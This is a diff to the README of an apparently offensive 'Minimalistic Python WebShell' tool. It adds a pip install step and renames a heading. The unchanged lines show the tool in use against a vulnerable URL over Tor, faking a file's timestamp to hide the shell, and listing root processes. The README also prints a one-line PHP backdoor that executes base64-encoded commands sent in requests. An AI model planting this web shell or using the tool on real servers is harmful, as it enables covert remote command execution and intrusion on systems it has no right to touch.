@@ -1,6 +1,8 @@
 # Minimalistic Python WebShell
 
 ```zsh
+$ pip install webshell
+
 $ torify webshell 'https://vuln.com/path/to/shell/ajax.php'
 Welcome to WebShell!
 WebShell> touch -a -m -t 201705030100.12 ajax.php
@@ -27,7 +29,7 @@ root  787448  0.0  0.0  49836  1652 ?        R    00:46   0:00 ps -aux
 WebShell> exit
 ```
 
-Shell example:
+PHP example:
 
 ```php
 <?php @passthru(base64_decode($_REQUEST['c']));
